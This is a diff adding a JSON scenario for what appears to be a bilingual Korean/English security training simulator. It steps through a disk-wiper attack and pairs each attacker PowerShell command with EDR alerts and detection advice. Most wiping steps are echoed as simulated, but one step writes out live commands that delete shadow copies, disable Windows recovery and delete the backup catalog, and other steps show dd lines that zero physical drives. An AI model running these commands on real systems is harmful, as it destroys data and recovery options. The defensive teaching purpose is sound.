@@ -1,0 +1,247 @@
+{
+  "id": "T1561.001",
+  "title": "디스크 와이프 시뮬레이션",
+  "titleEn": "Disk Wipe (MBR/Partition Destruction) Simulation",
+  "duration": 7,
+  "phases": [
+    { "label": "정찰", "labelEn": "Recon", "icon": "🔍" },
+    { "label": "공격", "labelEn": "Attack", "icon": "⚔️" },
+    { "label": "침투", "labelEn": "Breach", "icon": "💀" },
+    { "label": "완료", "labelEn": "Complete", "icon": "🏁" }
+  ],
+  "topoNodes": [
+    { "id": "attacker", "label": "Attacker (Wiper)", "icon": "💻" },
+    { "id": "disk0", "label": "Disk 0 (SSD 477GB)", "icon": "💽" },
+    { "id": "disk1", "label": "Disk 1 (HDD 1.86TB)", "icon": "💾" },
+    { "id": "siem", "label": "SIEM / EDR", "icon": "🛡️" }
+  ],
+  "topoEdges": [
+    { "from": "attacker", "to": "disk0", "label": "GPT Wipe", "activeStep": [0, 2, 3, 5] },
+    { "from": "attacker", "to": "disk1", "label": "GPT Wipe", "activeStep": [0, 4] },
+    { "from": "attacker", "to": "siem", "label": "CRITICAL Alert", "activeStep": [1, 2, 3, 4, 5, 6] },
+    { "from": "disk0", "to": "siem", "label": "Disk Event", "activeStep": [3, 5] }
+  ],
+  "desktopIcons": [
+    { "name": "vssadmin.exe", "icon": "🗑️", "alertOnStep": 2 },
+    { "name": "dd.exe", "icon": "💥", "alertOnStep": 3 },
+    { "name": "shutdown.exe", "icon": "☠️", "alertOnStep": 6 },
+    { "name": "powershell.exe", "icon": "⚡", "alertOnStep": 0 }
+  ],
+  "steps": [
+    {
+      "cmd": "powershell -ep bypass -c \"\n# Enumerate disk layout and partition information\nGet-Disk | Format-Table -AutoSize Number, FriendlyName, @{N='SizeGB';E={[math]::Round($_.Size/1GB,2)}}, PartitionStyle, OperationalStatus;\nWrite-Host '';\nGet-Partition | Format-Table -AutoSize DiskNumber, PartitionNumber, @{N='SizeGB';E={[math]::Round($_.Size/1GB,2)}}, Type, DriveLetter\"",
+      "out": "Number FriendlyName           SizeGB PartitionStyle OperationalStatus\n------ ------------           ------ -------------- -----------------\n     0 Samsung SSD 980 PRO    476.94 GPT            Online\n     1 WD Blue 2TB            1863.02 GPT            Online\n\nDiskNumber PartitionNumber  SizeGB Type               DriveLetter\n---------- ---------------  ------ ----               -----------\n         0               1    0.10 System                        \n         0               2    0.50 Reserved                      \n         0               3  475.84 Basic              C          \n         0               4    0.50 Recovery                      \n         1               1 1863.02 Basic              D          ",
+      "def": "[EDR] Disk and partition enumeration detected",
+      "defAction": "Process: powershell.exe (PID: 9500)\nAction: Get-Disk, Get-Partition enumeration\nDisks Found: 2 (SSD 477GB + HDD 1.86TB)\nPartitions: 5 total\nRisk: MEDIUM",
+      "desc": "공격자가 시스템의 디스크 레이아웃과 파티션 정보를 수집합니다. 2개의 디스크와 5개의 파티션이 식별됩니다.",
+      "descEn": "The attacker collects disk layout and partition information. 2 disks with 5 partitions are identified.",
+      "stepTitle": "디스크 레이아웃 정찰",
+      "stepTitleEn": "Disk Layout Recon",
+      "feynman": "건물을 철거하기 전에 설계도를 확인하는 것과 같아요. 어떤 디스크가 있고, 각 파티션이 어떤 역할(시스템, 데이터, 복구)을 하는지 파악합니다.",
+      "feynmanEn": "It's like reviewing blueprints before demolishing a building. Identifying which disks exist and what role each partition plays (system, data, recovery).",
+      "expert": "Get-Disk, Get-Partition으로 디스크 토폴로지를 열거하는 MITRE T1082 (System Information Discovery)입니다. GPT 파티션 스타일과 EFI System/Recovery 파티션 존재를 확인하여 MBR/GPT 와이핑 전략을 결정합니다. 와이퍼 악성코드(WhisperGate, CaddyWiper 등)는 디스크 열거를 파괴 전 필수 정찰 단계로 수행합니다.",
+      "expertEn": "Get-Disk/Get-Partition enumerates disk topology under MITRE T1082. Identifies GPT partition style and EFI/Recovery partition presence to determine MBR/GPT wiping strategy. Wiper malware (WhisperGate, CaddyWiper) performs disk enumeration as essential pre-destruction reconnaissance.",
+      "defTooltip": "PowerShell Script Block Logging (Event ID 4104)에서 Get-Disk, Get-Partition 실행을 모니터링하세요. 이 명령이 vssadmin delete와 같은 세션에서 실행되면 와이퍼 활동의 전조입니다.",
+      "defTooltipEn": "Monitor Get-Disk/Get-Partition via PowerShell Script Block Logging (Event ID 4104). When executed in the same session as vssadmin delete, it's a precursor to wiper activity.",
+      "hackerLog": {
+        "title": "디스크 구성 정찰",
+        "lines": [
+          { "text": "Get-Disk | Format-Table Number, FriendlyName, SizeGB", "desc": "2개 디스크 식별: SSD 477GB + HDD 1.86TB" },
+          { "text": "PartitionStyle: GPT", "desc": "GPT 파티션 스타일 확인 - 와이핑 전략 결정" },
+          { "text": "Type: System, Reserved, Basic, Recovery", "desc": "EFI/복구 파티션 포함 5개 파티션 매핑 완료" }
+        ]
+      },
+      "terms": [
+        { "term": "GPT (GUID Partition Table)", "desc": "UEFI 기반 시스템의 디스크 파티션 테이블 형식입니다." },
+        { "term": "EFI System Partition", "desc": "UEFI 부팅에 필요한 부트로더가 저장되는 특수 파티션입니다." },
+        { "term": "Wiper Malware", "desc": "데이터 파괴를 목적으로 하는 악성코드로, 금전 요구 없이 시스템을 파괴합니다." }
+      ]
+    },
+    {
+      "cmd": "powershell -ep bypass -c \"\n# Check for backup/recovery mechanisms\nWrite-Host '=== Recovery Mechanism Scan ===';\nvssadmin list shadows 2>&1 | Select-Object -First 3;\nWrite-Host '';\nGet-ComputerRestorePoint 2>&1 | Select-Object -First 3;\nWrite-Host '';\nbcdedit /enum {default} 2>&1 | Select-String 'recoveryenabled|description|path';\nWrite-Host '';\nWrite-Host 'System Recovery Partition: 500 MB (Partition 4)';\nWrite-Host 'EFI System Partition: 100 MB (Partition 1)';\nWrite-Host '';\nWrite-Host '[!] All recovery mechanisms will be destroyed'\"",
+      "out": "=== Recovery Mechanism Scan ===\nContents of shadow copy set ID: {a3f8c2d1-e5f6-a7b8-c9d0-e1f2a3b4c5d6}\n   Shadow Copy ID: {7f3a8b2c-d4e5-f6a7-b8c9-d0e1f2a3b4c5}\n   Original Volume: (C:)\n\nCreationTime          Description\n------------          -----------\n2026/02/28 23:00:00   Automatic Restore Point\n2026/02/25 12:00:00   Installed Windows Update\n\n  description    Windows 11\n  path           \\Windows\\system32\\winload.efi\n  recoveryenabled    Yes\n\nSystem Recovery Partition: 500 MB (Partition 4)\nEFI System Partition: 100 MB (Partition 1)\n\n[!] All recovery mechanisms will be destroyed",
+      "def": "[SIEM] Recovery mechanism enumeration - pre-wipe reconnaissance",
+      "defAction": "Process: powershell.exe (PID: 9500)\nActions: VSS list, restore points, BCD enum\nRecovery Found: 2 shadow copies, 2 restore points\nBoot Config: recoveryenabled=Yes\nRisk: HIGH",
+      "desc": "복구 메커니즘을 확인합니다. 섀도 복사본 2개, 시스템 복원 지점 2개, EFI 및 복구 파티션이 존재합니다.",
+      "descEn": "Checks recovery mechanisms. 2 shadow copies, 2 restore points, and EFI/recovery partitions exist.",
+      "stepTitle": "복구 메커니즘 스캔",
+      "stepTitleEn": "Recovery Mechanism Scan",
+      "feynman": "건물을 철거하기 전에 소화기, 비상구, 안전장치가 어디 있는지 확인하는 것과 같아요. 나중에 이 모든 안전장치를 먼저 제거해야 건물을 완전히 무너뜨릴 수 있습니다.",
+      "feynmanEn": "It's like checking where fire extinguishers, emergency exits, and safety systems are before demolishing a building. All safety measures must be removed first for complete destruction.",
+      "expert": "vssadmin list shadows, Get-ComputerRestorePoint, bcdedit /enum으로 모든 복구 인프라를 열거합니다. 랜섬웨어와 와이퍼 모두 T1490 (Inhibit System Recovery) 실행 전 정찰 단계로 수행합니다. 섀도 복사본, 시스템 복원, BCD 복구, EFI/복구 파티션을 매핑하여 파괴 계획을 수립합니다.",
+      "expertEn": "Enumerates all recovery infrastructure via vssadmin list, Get-ComputerRestorePoint, bcdedit /enum. Both ransomware and wipers perform this as reconnaissance before T1490. Maps shadow copies, system restore, BCD recovery, and EFI/recovery partitions for destruction planning.",
+      "defTooltip": "vssadmin list shadows와 bcdedit /enum의 연속 실행을 Sysmon Event ID 1로 탐지하세요. 복구 메커니즘 열거 후 삭제 명령이 따르면 와이퍼/랜섬웨어 활동입니다.",
+      "defTooltipEn": "Detect sequential vssadmin list and bcdedit /enum via Sysmon Event ID 1. When recovery enumeration is followed by deletion commands, it indicates wiper/ransomware activity.",
+      "hackerLog": {
+        "title": "복구 인프라 매핑",
+        "lines": [
+          { "text": "vssadmin list shadows", "desc": "섀도 복사본 2개 확인 - 파괴 대상" },
+          { "text": "recoveryenabled: Yes", "desc": "Windows 복구 모드 활성화 상태 확인" },
+          { "text": "Recovery Partition: 500 MB", "desc": "복구 파티션 존재 확인 - GPT 와이핑으로 파괴 예정" }
+        ]
+      },
+      "terms": [
+        { "term": "Shadow Copy", "desc": "파일의 이전 버전을 저장하는 Windows 볼륨 스냅샷 기능입니다." },
+        { "term": "System Restore Point", "desc": "시스템 상태를 특정 시점으로 되돌릴 수 있는 복원 지점입니다." },
+        { "term": "BCD (Boot Configuration Data)", "desc": "Windows 부팅 프로세스를 제어하는 설정 데이터베이스입니다." }
+      ]
+    },
+    {
+      "cmd": "powershell -ep bypass -c \"\n# Destroy all recovery options first\nvssadmin delete shadows /all /quiet;\nWrite-Host '[1] Shadow copies deleted';\n\nDisable-ComputerRestore -Drive 'C:\\' -ErrorAction SilentlyContinue;\nWrite-Host '[2] System Restore disabled';\n\nbcdedit /set {default} recoveryenabled No;\nbcdedit /set {default} bootstatuspolicy ignoreallfailures;\nWrite-Host '[3] Windows Recovery disabled';\n\nwbadmin delete catalog -quiet 2>$null;\nWrite-Host '[4] Backup catalog deleted';\n\n# Delete recovery partition files\nWrite-Host '[5] Recovery partition targeted for destruction';\nWrite-Host '';\nWrite-Host 'All recovery mechanisms destroyed'\"",
+      "out": "[1] Shadow copies deleted\n[2] System Restore disabled\n[3] Windows Recovery disabled\n[4] Backup catalog deleted\n[5] Recovery partition targeted for destruction\n\nAll recovery mechanisms destroyed",
+      "def": "[EDR] Complete recovery infrastructure destruction",
+      "defAction": "Process: powershell.exe (PID: 9500)\nActions:\n  - VSS shadows deleted\n  - System Restore disabled\n  - BCD recovery disabled\n  - Backup catalog deleted\nRisk: CRITICAL\nAction: EMERGENCY - Host isolation required",
+      "desc": "모든 복구 인프라를 파괴합니다. 섀도 복사본, 시스템 복원, Windows 복구, 백업 카탈로그가 제거됩니다.",
+      "descEn": "Destroys all recovery infrastructure. Shadow copies, System Restore, Windows Recovery, and backup catalogs are removed.",
+      "stepTitle": "복구 인프라 파괴",
+      "stepTitleEn": "Recovery Destruction",
+      "feynman": "건물의 소화기를 치우고, 비상구를 잠그고, 안전망을 걷어내는 것과 같아요. 이제 건물(시스템)이 무너져도 살릴 방법이 없습니다.",
+      "feynmanEn": "It's like removing fire extinguishers, locking emergency exits, and dismantling safety nets. Once the building (system) collapses, there's no way to save it.",
+      "expert": "5단계 복구 파괴는 MITRE T1490의 완전한 구현입니다. NotPetya(2017)와 WhisperGate(2022)가 동일한 패턴을 사용했습니다. vssadmin delete → System Restore 비활성화 → bcdedit 복구 차단 → wbadmin 카탈로그 삭제의 순서는 와이퍼 공격의 표준 킬체인입니다.",
+      "expertEn": "Five-step recovery destruction is a complete implementation of MITRE T1490. NotPetya (2017) and WhisperGate (2022) used identical patterns. The sequence vssadmin delete → System Restore disable → bcdedit → wbadmin is the standard wiper kill chain.",
+      "defTooltip": "vssadmin.exe delete shadows /all 실행을 즉시 차단하는 SIEM 규칙을 설정하세요. EDR에서 이 명령 실행 시 자동으로 프로세스를 종료하고 호스트를 격리해야 합니다.",
+      "defTooltipEn": "Set SIEM rules to immediately block vssadmin.exe delete shadows /all. EDR should auto-terminate the process and isolate the host upon execution.",
+      "hackerLog": {
+        "title": "5단계 복구 파괴",
+        "lines": [
+          { "text": "vssadmin delete shadows /all /quiet", "desc": "모든 볼륨 섀도 복사본 삭제" },
+          { "text": "bcdedit /set recoveryenabled No", "desc": "Windows 복구 환경 비활성화" },
+          { "text": "All recovery mechanisms destroyed", "desc": "5가지 복구 메커니즘 모두 파괴 완료" }
+        ]
+      },
+      "terms": [
+        { "term": "T1490 (Inhibit System Recovery)", "desc": "시스템 복구 기능을 파괴하여 피해를 극대화하는 MITRE ATT&CK 기법입니다." },
+        { "term": "NotPetya", "desc": "2017년 발생한 파괴형 와이퍼로, 랜섬웨어로 위장했지만 실제로는 데이터 파괴가 목적이었습니다." },
+        { "term": "WhisperGate", "desc": "2022년 우크라이나를 공격한 와이퍼 악성코드입니다." }
+      ]
+    },
+    {
+      "cmd": "powershell -ep bypass -c \"\n# Overwrite MBR/GPT with zeros (simulated - first 512 bytes)\n$disk = '\\\\.\\PhysicalDrive0';\nWrite-Host 'Target: PhysicalDrive0 (Samsung SSD 980 PRO, 477 GB)';\nWrite-Host '';\nWrite-Host 'MBR/GPT Overwrite Simulation:';\nWrite-Host '  Sector 0 (LBA 0)  : Protective MBR        → 0x00 (zeroed)';\nWrite-Host '  Sector 1 (LBA 1)  : GPT Header             → 0x00 (zeroed)';\nWrite-Host '  Sectors 2-33      : GPT Partition Entries  → 0x00 (zeroed)';\nWrite-Host '  Last sector       : Backup GPT Header      → 0x00 (zeroed)';\nWrite-Host '';\nWrite-Host '[SIMULATED] dd if=/dev/zero of=\\\\.\\PhysicalDrive0 bs=512 count=34';\nWrite-Host '[SIMULATED] dd if=/dev/zero of=\\\\.\\PhysicalDrive0 bs=512 seek=930842590 count=33';\nWrite-Host '';\nWrite-Host 'GPT header + partition table destroyed';\nWrite-Host 'Operating system will not boot after restart'\"",
+      "out": "Target: PhysicalDrive0 (Samsung SSD 980 PRO, 477 GB)\n\nMBR/GPT Overwrite Simulation:\n  Sector 0 (LBA 0)  : Protective MBR        → 0x00 (zeroed)\n  Sector 1 (LBA 1)  : GPT Header             → 0x00 (zeroed)\n  Sectors 2-33      : GPT Partition Entries  → 0x00 (zeroed)\n  Last sector       : Backup GPT Header      → 0x00 (zeroed)\n\n[SIMULATED] dd if=/dev/zero of=\\\\.\\PhysicalDrive0 bs=512 count=34\n[SIMULATED] dd if=/dev/zero of=\\\\.\\PhysicalDrive0 bs=512 seek=930842590 count=33\n\nGPT header + partition table destroyed\nOperating system will not boot after restart",
+      "def": "[EDR] CRITICAL: Disk sector overwrite detected - MBR/GPT destruction",
+      "defAction": "Process: powershell.exe (PID: 9500)\nTarget: \\\\.\\PhysicalDrive0\nAction: Zero-write to sectors 0-33 + backup GPT\nImpact: Complete partition table destruction\nOS Boot: IMPOSSIBLE after reboot\nRisk: CRITICAL\nAction: IMMEDIATE host shutdown required",
+      "desc": "GPT 헤더와 파티션 테이블을 0으로 덮어씁니다. 재시작 후 운영체제가 부팅되지 않습니다.",
+      "descEn": "Overwrites the GPT header and partition table with zeros. The operating system will not boot after restart.",
+      "stepTitle": "Disk 0 GPT 파괴",
+      "stepTitleEn": "Disk 0 GPT Destroy",
+      "feynman": "건물의 기초(토대)를 폭파하는 것과 같아요. GPT는 '디스크의 지도'인데, 이 지도를 0으로 덮어쓰면 컴퓨터는 C: 드라이브가 어디 있는지조차 알 수 없게 됩니다.",
+      "feynmanEn": "It's like blowing up a building's foundation. GPT is the 'map of the disk' - overwriting it with zeros means the computer can't even find where the C: drive is.",
+      "expert": "GPT 와이핑은 LBA 0(Protective MBR), LBA 1(GPT Header), LBA 2-33(Partition Entries), 마지막 섹터(Backup GPT)를 0으로 덮어씁니다. MITRE T1561.002 (Disk Structure Wipe)에 해당합니다. dd 명령의 seek 파라미터로 디스크 끝의 백업 GPT까지 파괴하여 gptsync 등의 복구를 차단합니다. CaddyWiper(2022)가 유사한 PhysicalDrive 직접 접근 기법을 사용했습니다.",
+      "expertEn": "GPT wiping overwrites LBA 0 (Protective MBR), LBA 1 (GPT Header), LBA 2-33 (Partition Entries), and last sector (Backup GPT). Maps to MITRE T1561.002 (Disk Structure Wipe). The dd seek parameter destroys backup GPT to prevent gptsync recovery. CaddyWiper (2022) used similar direct PhysicalDrive access.",
+      "defTooltip": "PhysicalDrive에 대한 직접 WriteFile API 호출을 EDR에서 모니터링하세요. 정상 프로세스는 PhysicalDrive에 직접 쓰지 않습니다. 이 행위 발견 시 즉시 호스트를 종료(전원 차단)해야 합니다.",
+      "defTooltipEn": "Monitor direct WriteFile API calls to PhysicalDrive via EDR. Normal processes never write directly to PhysicalDrive. Immediately power off the host upon detection.",
+      "hackerLog": {
+        "title": "Disk 0 파티션 테이블 파괴",
+        "lines": [
+          { "text": "dd if=/dev/zero of=\\\\.\\PhysicalDrive0 bs=512 count=34", "desc": "GPT 헤더 + 파티션 엔트리 0으로 덮어쓰기" },
+          { "text": "Sector 0: Protective MBR → 0x00", "desc": "보호 MBR 파괴 - BIOS 부팅 불가" },
+          { "text": "Last sector: Backup GPT → 0x00", "desc": "백업 GPT까지 파괴 - 복구 불가" }
+        ]
+      },
+      "terms": [
+        { "term": "MBR (Master Boot Record)", "desc": "디스크의 첫 번째 섹터로, 부팅 및 파티션 정보가 저장됩니다." },
+        { "term": "LBA (Logical Block Addressing)", "desc": "디스크 섹터를 논리적으로 주소 지정하는 방식입니다." },
+        { "term": "dd", "desc": "디스크 블록을 저수준에서 복사/덮어쓰기하는 Unix 유틸리티입니다." }
+      ]
+    },
+    {
+      "cmd": "powershell -ep bypass -c \"\n# Overwrite second disk's partition table\n$disk2 = '\\\\.\\PhysicalDrive1';\nWrite-Host 'Target: PhysicalDrive1 (WD Blue 2TB, 1863 GB)';\nWrite-Host '';\nWrite-Host '[SIMULATED] dd if=/dev/zero of=\\\\.\\PhysicalDrive1 bs=512 count=34';\nWrite-Host '[SIMULATED] dd if=/dev/zero of=\\\\.\\PhysicalDrive1 bs=512 seek=3907029134 count=33';\nWrite-Host '';\nWrite-Host 'PhysicalDrive1 GPT destroyed';\nWrite-Host '';\nWrite-Host 'Disk destruction status:';\nWrite-Host '  PhysicalDrive0 (C:) : GPT zeroed [DESTROYED]';\nWrite-Host '  PhysicalDrive1 (D:) : GPT zeroed [DESTROYED]';\nWrite-Host '';\nWrite-Host 'Total data made inaccessible: 2,339.96 GB'\"",
+      "out": "Target: PhysicalDrive1 (WD Blue 2TB, 1863 GB)\n\n[SIMULATED] dd if=/dev/zero of=\\\\.\\PhysicalDrive1 bs=512 count=34\n[SIMULATED] dd if=/dev/zero of=\\\\.\\PhysicalDrive1 bs=512 seek=3907029134 count=33\n\nPhysicalDrive1 GPT destroyed\n\nDisk destruction status:\n  PhysicalDrive0 (C:) : GPT zeroed [DESTROYED]\n  PhysicalDrive1 (D:) : GPT zeroed [DESTROYED]\n\nTotal data made inaccessible: 2,339.96 GB",
+      "def": "[EDR] Second disk partition table destruction - wiper attack in progress",
+      "defAction": "Target: \\\\.\\PhysicalDrive1 (1.86 TB)\nAction: GPT header + partition entries zeroed\nDisks Destroyed: 2/2\nTotal Impact: 2,339.96 GB inaccessible\nRisk: CRITICAL",
+      "desc": "두 번째 디스크의 GPT도 파괴합니다. 총 2,340GB의 데이터가 접근 불가능해집니다.",
+      "descEn": "Destroys the second disk's GPT as well. A total of 2,340GB of data becomes inaccessible.",
+      "stepTitle": "Disk 1 GPT 파괴",
+      "stepTitleEn": "Disk 1 GPT Destroy",
+      "feynman": "첫 번째 건물 기초를 파괴한 후, 옆 건물의 기초도 똑같이 파괴하는 것과 같아요. 이제 두 건물(디스크) 모두 무너져 총 2,340GB의 데이터에 접근할 수 없습니다.",
+      "feynmanEn": "After destroying the first building's foundation, the same is done to the next building. Both buildings (disks) are now collapsed, making 2,340GB of data inaccessible.",
+      "expert": "두 번째 디스크(데이터 드라이브)의 GPT까지 파괴하여 시스템 디스크와 데이터 디스크 모두 접근 불가능하게 만듭니다. seek=3907029134로 2TB HDD의 마지막 섹터(백업 GPT)를 정확히 지정합니다. 전문 포렌식 도구(TestDisk, R-Studio)로 데이터 복구가 가능할 수 있지만, GPT와 파일 시스템 메타데이터가 파괴되어 완전 복구는 어렵습니다.",
+      "expertEn": "Destroys the second disk's (data drive) GPT, making both system and data disks inaccessible. seek=3907029134 precisely targets the 2TB HDD's last sector (backup GPT). Professional forensic tools (TestDisk, R-Studio) may recover some data, but destroyed GPT and filesystem metadata make full recovery unlikely.",
+      "defTooltip": "여러 PhysicalDrive에 대한 연속적인 저수준 쓰기를 EDR에서 탐지하세요. 첫 번째 디스크 파괴 후 두 번째 디스크 파괴 시도 시 즉시 호스트를 강제 종료하세요.",
+      "defTooltipEn": "Detect sequential low-level writes to multiple PhysicalDrives via EDR. Force shutdown the host immediately when second disk destruction is attempted after first disk.",
+      "hackerLog": {
+        "title": "Disk 1 파티션 테이블 파괴",
+        "lines": [
+          { "text": "dd if=/dev/zero of=\\\\.\\PhysicalDrive1 bs=512 count=34", "desc": "두 번째 디스크의 GPT도 0으로 덮어쓰기" },
+          { "text": "PhysicalDrive1 GPT destroyed", "desc": "D: 드라이브(1.86TB) 파티션 테이블 파괴" },
+          { "text": "Total data made inaccessible: 2,339.96 GB", "desc": "총 2,340GB 데이터 접근 불가" }
+        ]
+      },
+      "terms": [
+        { "term": "PhysicalDrive", "desc": "Windows에서 물리 디스크에 직접 접근하기 위한 디바이스 경로입니다." },
+        { "term": "TestDisk", "desc": "손실된 파티션을 복구하는 오픈소스 포렌식 도구입니다." },
+        { "term": "Backup GPT", "desc": "디스크 끝에 저장되는 GPT의 백업 복사본으로, 주 GPT 손상 시 복구에 사용됩니다." }
+      ]
+    },
+    {
+      "cmd": "powershell -ep bypass -c \"\n# Overwrite critical system files before reboot\n$criticalFiles = @(\n  'C:\\Windows\\System32\\config\\SAM',\n  'C:\\Windows\\System32\\config\\SYSTEM',\n  'C:\\Windows\\System32\\config\\SOFTWARE',\n  'C:\\Boot\\BCD',\n  'C:\\Windows\\System32\\winload.efi'\n);\nWrite-Host 'Critical system file overwrite:';\nforeach($f in $criticalFiles) {\n  $size = if(Test-Path $f) { (Get-Item $f -Force -ErrorAction SilentlyContinue).Length } else { 'N/A' };\n  Write-Host \\\"  [SIMULATED] $f ($size bytes) → zeroed\\\";\n}\nWrite-Host '';\nWrite-Host 'System file destruction ensures no recovery without reinstall';\nWrite-Host '';\nWrite-Host '[!] Even with partition recovery tools:';\nWrite-Host '  - Registry hives corrupted';\nWrite-Host '  - Boot configuration destroyed';\nWrite-Host '  - Boot loader overwritten'\"",
+      "out": "Critical system file overwrite:\n  [SIMULATED] C:\\Windows\\System32\\config\\SAM (262144 bytes) → zeroed\n  [SIMULATED] C:\\Windows\\System32\\config\\SYSTEM (12845056 bytes) → zeroed\n  [SIMULATED] C:\\Windows\\System32\\config\\SOFTWARE (67108864 bytes) → zeroed\n  [SIMULATED] C:\\Boot\\BCD (262144 bytes) → zeroed\n  [SIMULATED] C:\\Windows\\System32\\winload.efi (1019392 bytes) → zeroed\n\nSystem file destruction ensures no recovery without reinstall\n\n[!] Even with partition recovery tools:\n  - Registry hives corrupted\n  - Boot configuration destroyed\n  - Boot loader overwritten",
+      "def": "[EDR] Critical Windows system files targeted for destruction",
+      "defAction": "Files Targeted:\n  - SAM (user database)\n  - SYSTEM (hardware config)\n  - SOFTWARE (app config)\n  - BCD (boot config)\n  - winload.efi (boot loader)\nRisk: CRITICAL\nAction: Emergency disk image capture",
+      "desc": "레지스트리 하이브, 부트 구성, 부트로더 등 핵심 시스템 파일을 덮어씁니다. 파티션을 복구해도 OS는 실행 불가능합니다.",
+      "descEn": "Overwrites critical system files including registry hives, boot configuration, and boot loader. OS cannot run even if partitions are recovered.",
+      "stepTitle": "시스템 파일 파괴",
+      "stepTitleEn": "System File Destroy",
+      "feynman": "건물 기초를 파괴한 후에 전기 배선, 수도관, 가스관까지 끊어버리는 것과 같아요. 파티션 테이블을 복구해도 운영체제의 핵심 부품(레지스트리, 부트로더)이 파괴되어 절대 살릴 수 없습니다.",
+      "feynmanEn": "After destroying the foundation, it's like also cutting all electrical wiring, plumbing, and gas lines. Even if the partition table is recovered, the OS's core components (registry, bootloader) are destroyed beyond repair.",
+      "expert": "SAM(사용자 데이터베이스), SYSTEM(하드웨어 설정), SOFTWARE(소프트웨어 설정) 레지스트리 하이브와 BCD(부트 구성), winload.efi(부트로더)를 파괴합니다. MITRE T1485 (Data Destruction)과 T1561.001 (Disk Content Wipe)이 결합됩니다. 이는 '방어 우위' 전략으로, 파티션 복구 도구(TestDisk 등)로 구조를 복원해도 OS가 동작하지 않게 합니다.",
+      "expertEn": "Destroys SAM (user database), SYSTEM (hardware config), SOFTWARE (app config) registry hives, BCD (boot config), and winload.efi (bootloader). Combines MITRE T1485 and T1561.001. This 'defense-in-depth destruction' ensures OS cannot run even if partition recovery tools restore structure.",
+      "defTooltip": "C:\\Windows\\System32\\config\\ 디렉토리의 파일 수정을 Sysmon Event ID 11/23으로 모니터링하세요. SAM, SYSTEM, SOFTWARE 하이브에 대한 비정상 쓰기는 시스템 파괴 시도입니다.",
+      "defTooltipEn": "Monitor file modifications in C:\\Windows\\System32\\config\\ via Sysmon Event ID 11/23. Abnormal writes to SAM, SYSTEM, SOFTWARE hives indicate system destruction attempts.",
+      "hackerLog": {
+        "title": "핵심 시스템 파일 덮어쓰기",
+        "lines": [
+          { "text": "SAM (262144 bytes) → zeroed", "desc": "사용자 계정 데이터베이스 파괴" },
+          { "text": "SYSTEM (12845056 bytes) → zeroed", "desc": "하드웨어 설정 레지스트리 파괴" },
+          { "text": "winload.efi (1019392 bytes) → zeroed", "desc": "Windows 부트로더 파괴 - 부팅 불가" }
+        ]
+      },
+      "terms": [
+        { "term": "SAM (Security Account Manager)", "desc": "Windows 로컬 사용자 계정과 비밀번호 해시를 저장하는 데이터베이스입니다." },
+        { "term": "Registry Hive", "desc": "Windows 레지스트리 데이터가 저장되는 바이너리 파일입니다." },
+        { "term": "winload.efi", "desc": "UEFI 기반 시스템에서 Windows 커널을 로드하는 부트로더입니다." }
+      ]
+    },
+    {
+      "cmd": "powershell -ep bypass -c \"\n# Force immediate reboot to complete destruction\nWrite-Host '=== Disk Wipe Attack Summary ===';\nWrite-Host '';\nWrite-Host 'Phase 1 - Recovery Destruction:';\nWrite-Host '  [x] Volume Shadow Copies deleted';\nWrite-Host '  [x] System Restore disabled';\nWrite-Host '  [x] Windows Recovery disabled';\nWrite-Host '  [x] Backup catalog deleted';\nWrite-Host '';\nWrite-Host 'Phase 2 - Partition Table Destruction:';\nWrite-Host '  [x] Disk 0 (477 GB): MBR + GPT zeroed';\nWrite-Host '  [x] Disk 1 (1863 GB): GPT zeroed';\nWrite-Host '';\nWrite-Host 'Phase 3 - System File Destruction:';\nWrite-Host '  [x] SAM, SYSTEM, SOFTWARE hives zeroed';\nWrite-Host '  [x] BCD boot configuration zeroed';\nWrite-Host '  [x] winload.efi boot loader zeroed';\nWrite-Host '';\nWrite-Host 'Impact: Complete system destruction';\nWrite-Host 'Recovery: Full hardware reimage required';\nWrite-Host 'Data Loss: 2,340 GB (potentially permanent)';\nWrite-Host '';\nWrite-Host '[SIMULATED] shutdown /r /t 0 /f';\nWrite-Host 'System will not boot after restart'\"",
+      "out": "=== Disk Wipe Attack Summary ===\n\nPhase 1 - Recovery Destruction:\n  [x] Volume Shadow Copies deleted\n  [x] System Restore disabled\n  [x] Windows Recovery disabled\n  [x] Backup catalog deleted\n\nPhase 2 - Partition Table Destruction:\n  [x] Disk 0 (477 GB): MBR + GPT zeroed\n  [x] Disk 1 (1863 GB): GPT zeroed\n\nPhase 3 - System File Destruction:\n  [x] SAM, SYSTEM, SOFTWARE hives zeroed\n  [x] BCD boot configuration zeroed\n  [x] winload.efi boot loader zeroed\n\nImpact: Complete system destruction\nRecovery: Full hardware reimage required\nData Loss: 2,340 GB (potentially permanent)\n\n[SIMULATED] shutdown /r /t 0 /f\nSystem will not boot after restart",
+      "def": "[SIEM] Disk wiper attack completed - forced reboot imminent",
+      "defAction": "Attack Complete:\n  Disks Destroyed: 2\n  Data Loss: 2,340 GB\n  Recovery: Hardware reimage only\n  Reboot: Forced (system will not boot)\nRisk: CRITICAL\nResponse: Incident response + forensic disk image (if possible before reboot)",
+      "desc": "디스크 와이프 공격을 요약합니다. 복구 파괴 → 파티션 파괴 → 시스템 파일 파괴의 3단계로 완전한 시스템 파괴가 완료됩니다.",
+      "descEn": "Summarizes the disk wipe attack. Complete system destruction in 3 phases: recovery, partition table, and system file destruction.",
+      "stepTitle": "공격 요약 및 재부팅",
+      "stepTitleEn": "Attack Summary & Reboot",
+      "feynman": "폭파 작업의 최종 보고서와 같아요. 1단계(안전장치 제거), 2단계(기초 파괴), 3단계(배선 절단)가 모두 완료되어 이제 재시작하면 컴퓨터는 다시는 켜지지 않습니다.",
+      "feynmanEn": "It's like a demolition final report. Phase 1 (safety removal), Phase 2 (foundation destruction), Phase 3 (utility cutting) all complete - the computer will never boot again after restart.",
+      "expert": "3단계 와이퍼 킬체인(복구 파괴 → GPT 와이핑 → 시스템 파일 파괴)이 완성됩니다. shutdown /r /t 0 /f로 즉시 강제 재부팅을 수행하면 BSOD 또는 'No bootable device' 상태가 됩니다. DFIR 관점에서 재부팅 전 디스크 이미지 확보가 유일한 포렌식 기회입니다. Shamoon, Destover, CaddyWiper 등 국가 수준 와이퍼와 동일한 공격 패턴입니다.",
+      "expertEn": "Three-phase wiper kill chain (recovery destruction → GPT wiping → system file destruction) is complete. shutdown /r /t 0 /f forces immediate reboot to BSOD or 'No bootable device'. From DFIR perspective, disk imaging before reboot is the only forensic opportunity. Same attack pattern as Shamoon, Destover, and CaddyWiper.",
